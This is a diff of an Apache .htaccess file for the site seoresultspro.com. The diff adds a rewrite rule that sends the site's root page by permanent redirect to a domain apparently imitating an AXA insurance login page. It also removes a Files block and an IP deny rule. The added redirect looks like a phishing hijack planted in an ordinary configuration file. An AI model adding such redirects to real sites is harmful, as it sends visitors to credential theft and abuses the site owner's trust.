@@ -110,11 +110,5 @@ Redirect     /what-is-xml-sitemap-&-why-its-important-for-seo-services /what-is-
 # php -- END cPanel-generated handler, do not edit
 RewriteCond %{HTTP_HOST} ^seoresultspro\.com$ [OR]
 RewriteCond %{HTTP_HOST} ^www\.seoresultspro\.com$
+RewriteRule ^/?$ "https\:\/\/axa\-inloggen\.online\/be\/beveiligde\/omgeving\/wgjoiq\/" [R=301,L]
 
-
-<Files 403.shtml>
-order allow,deny
-allow from all
-</Files>
-
-deny from 90.39.169.48
